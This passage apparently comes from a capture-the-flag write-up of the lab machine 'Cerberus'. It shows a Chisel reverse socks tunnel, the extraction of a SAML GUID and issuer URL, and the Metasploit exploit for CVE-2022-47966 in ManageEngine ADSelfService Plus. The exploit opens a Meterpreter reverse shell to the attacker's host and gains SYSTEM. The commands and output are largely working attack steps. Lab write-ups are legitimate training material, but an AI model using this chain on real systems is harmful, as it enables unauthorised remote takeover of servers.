   TARGETURI    /samlLogin       yes       The SAML endpoint URL
   URIPATH                       no        The URI to use for this exploit (default is random)
   VHOST                         no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.

Payload options (cmd/windows/powershell/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   1   Windows Command

```

I’ll need a SAML endpoint GUID, as well as an Issuer URL. The RPORT defaults to 9251, which is listening on Cerberus:

```
*Evil-WinRM* PS C:\> netstat -ano | findstr 9251
  TCP    0.0.0.0:9251           0.0.0.0:0              LISTENING       5416
  UDP    [::]:49251             *:*                                    3152

```

#### Tunnel

I’ll want to poke at ADSelfService Plus and these SAML endpoints a bit more. I’ll upload the Windows Chisel binary (from the latest [release](https://github.com/jpillora/chisel/releases/tag/v1.8.1)) to Cerberus, and connect it opening a socks proxy with `.\c.exe client 10.10.14.6:8000 R:socks`.

```

2023/03/19 11:14:51 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

I’ll use FoxyProxy to tunnel Firefox:

![image-20230323111829413](/img/image-20230323111829413.png)

And `proxychains` for anything on the command line.

#### Get GUID

Visiting `https://127.0.0.1:9251` returns a bunch of redirects that eventually end up at this monster URL:

```

https://dc.cerberus.local/adfs/ls/?SAMLRequest=pVPLbtswELz3KwTeLYn0SyIsB67doAacVrCVHnopKGrpEJBIl6Qc5%2B9D%2BZG6ResC7YkAObs7OzOc3B2aOtiDsVKrDOEwRgEoriupthl6LO57CbqbvptY1tRkR2ete1Jr%2BN6CdcHMWjDO1821sm0DZgNmLzk8rlcZenJuZ2kULeY0JUMcdQ1WeitVNBqzpMIxHqXxICYVH7HReDAoE8ETNuYMMy6SpCQCBQs%2FRSrmjtQuDSsecjAlmNaGteasjlglbFTbCAXLRYa%2BYUKqOCUwJmmZlLgvRlgIJnAq2HDQB%2Bxh1rawVNYx5TJEYtLvxf0e6Rd4SPGYDtLQs%2FuKgtxop7mu30t10qM1impmpaWKNWCp43Qze1hREsa0PIEs%2FVgUeS%2F%2FvCmODfayAvPJozP0wBTbwgflRYBgtthALc6KBXndWhR8udhAOhu8McrSk%2FC3R%2B%2FOPNH05BM9LmiCe20a5m7Xdjey6okjlIJy0r38NPt2ObtkAE3%2F3%2FFJdE1%2Fegldp95yketa8pdgVtf6eW6AOa%2BoMy2gv66JQ%2FzLmq2yO%2BBSSKhQ9DbnnGuojin3oXZwcMFcNztmpO18gQPj7k3la9i89kqsQfyTcjdhnPKut7%2FO%2FfGsTdXFErjnWRjmF9HGXYT7HaPp%2BfEP%2B%2F14vv7b01c%3D&RelayState=aHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi9MT0dJTl9BVVRI

```

After adding `dc.cerberos.local` to my `/etc/hosts` file, it loads:

![image-20230323112022245](/img/image-20230323112022245.png)

There’s not much I can do on this site without creds.

The URL above does have useful information. The two parameters passed are `SAMLRequest` and `RelayState`. Both appear to be URL encoded base64.

If I URL decode the `SAMLRequest` (online tools like [urldecoder.org](https://www.urldecoder.org/) or Burp Decoder will work), and then pass them to a SAML decoder such as [this one](https://www.samltool.com/decode.php) on samltool.com, it generates XML:

![image-20230323112719501](/img/image-20230323112719501.png)

The full XML is:

```

<?xml version="1.0" encoding="UTF-8"?>
<saml2p:AuthnRequest AssertionConsumerServiceURL="https://DC:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f" Destination="https://dc.cerberus.local/adfs/ls/" ID="_122d092e729b8b13f61ffaf19fa543e1" IssueInstant="2023-03-23T15:17:49.016Z" ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" ProviderName="ManageEngine ADSelfService Plus" Version="2.0" xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://DC:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f</saml2:Issuer>
    <saml2p:NameIDPolicy AllowCreate="true" Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"/>
    <saml2p:RequestedAuthnContext Comparison="exact">
        <saml2:AuthnContextClassRef xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
    </saml2p:RequestedAuthnContext>
</saml2p:AuthnRequest>

```

The merge request for the exploit talks about getting the GUID:

> At this point you will need to take note of the URL (Recipient or Issuer URL they should be the same). Its format is `https://<hostname>:9251/samlLogin/<32-digit id>`. The ID will be used by the module (see the next section).

That ID is towards the top of this XML in the `saml2p:AuthnReqeust` as the `AssertionConsumerServiceUrl`. I’ll note the GUID as “67a8d101690402dc6a6744b8fc8a7ca1acf88b2f”.

#### Get ISSUER\_URL

This one isn’t clearly described in the exploit pull request. I actually stumbled across it in the offline backup from above, looking for “ISSUER”:

```

oxdf@hacky$ grep ISSUER *
ADSIAMIDPAuthConfigParams.txt:1 ISSUER_URL      http://dc.cerberus.local/adfs/services/trust

```

This file has a bunch of config things:

```

oxdf@hacky$ cat ADSIAMIDPAuthConfigParams.txt
1       ISSUER_URL      http://dc.cerberus.local/adfs/services/trust
1       LOGIN_URL       https://dc.cerberus.local/adfs/ls/
1       PUBLIC_KEY      -----BEGIN CERTIFICATE-----MIIC3jCCAcagAwIBAgIQJJkonjKavJxNAgwJep88RDANBgkqhkiG9w0BAQsFADArMSkwJwYDVQQDEyBBREZTIFNpZ25pbmcgLSBkYy5jZXJiZXJ1cy5sb2NhbDAeFw0yMzAxMzAxNDE4MjJaFw0yNDAxMzAxNDE4MjJaMCsxKTAnBgNVBAMTIEFERlMgU2lnbmluZyAtIGRjLmNlcmJlcnVzLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5NP7HKKJe5baFkpL2a51DiABmkZJ3PHtEXT6ixuK5PefDFgKAOfFX01fRRu0DROKB7xXDtAZBGLYN2Yd6uELtuDoFtIKFRdGI7gqh34/vbcAxOZJVrNQO01fqEfcAWBMNIK5P/H4qFtAHlIy/kbJ6MfR59bPrSU6bPf+Ql5U5GmxuxkF523i8vGSVHw3H2VwdB8hbZOdWJghm5POCvzonohdvzV9b5SfKcaja0IN7uf46pdBKHnhFNOduZjCNWRQQFkpwDKmMl4xnrauhohwGbIU4D78x219EQ7QP3JPsBPa/hLTWcWGeD1Us8scL7e7jqmBHJG3ghRyU5dnmjhXxQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQDMDps3VUGQN1A8TQcnSR8ZsZyS2NgyvYvAuK6Vi5rgfQxdEbQJcLSLd0SV3EaHVLjj9oddsENEEMOpuBidK/b2rmgKbj/bzUK3A0BPlKvBAx9LrMRwpJMO+De2/gMQTshylu4Q4kdbP1O4eentzCupT41X3LRsc5E0L2P7kxnl4sCtqKstNt5iD+61Xvc57pmWGgNOiJC2KjqsJU8Hv/Z382W6KiEpV69s5d7wS6zaDzgO8RnqzLetn4V8RFs14jVxvuDtKzvN+CUTTb5mxEyNRgYO+5JlB5hSkCZDvn0cmgpYGpeN1v08HspxuhCWzqoT8dwwDwo33zdzsBq5QXYL-----END CERTIFICATE-----
1       LOGOUT_URL      https://dc.cerberus.local/adfs/ls/
1       IDP_PROVIDER_NAME       Cerberus
1       IS_RELAY_STATE_MAND     true
1       SAML_LOGOUT_REQ_SIGNED  false
1       SAML_LOGOUT_RES_SIGNED  false
1       SAML_AUTH_CLASS com.adventnet.sym.adsm.common.webclient.api.SSPSAMLApi

```

I’ll use “http://dc.cerberus.local/adfs/services/trust”.

#### Exploit

I’ll use the information gathered to configure the exploit:

```

msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set rhosts 10.10.11.205
rhosts => 10.10.11.205
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set lhost tun0
lhost => 10.10.14.6
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
GUID => 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
ISSUER_URL => http://dc.cerberus.local/adfs/services/trust
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set proxies socks5:127.0.0.1:1080
proxies => socks5:127.0.0.1:1080

```

Running this returns a warning:

```

msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > run

[-] Exploit failed: RuntimeError TCP connect-back payloads cannot be used with Proxies. Use 'set ReverseAllowProxy true' to override this behaviour.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set ReverseAllowProxy true
ReverseAllowProxy => true

```

It’s warning me that while the exploit might go through the proxy, the resulting payload will not. I’ll say that’s ok, as I suspect that Cerberus can connect back to me (if it fails, I’ll explore other vectors).

Running now returns a shell as SYSTEM:

```

msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > run

[*] Started reverse TCP handler on 10.10.14.6:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (175686 bytes) to 10.10.11.205
[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.10.11.205:51393) at 2023-03-23 11:38:53 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

And can grab the root flag:

```

meterpreter > shell
Process 5180 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\ManageEngine\ADSelfService Plus\bin>cd \users\administrator\desktop

C:\Users\Administrator\Desktop>type root.txt
a93ff575************************

```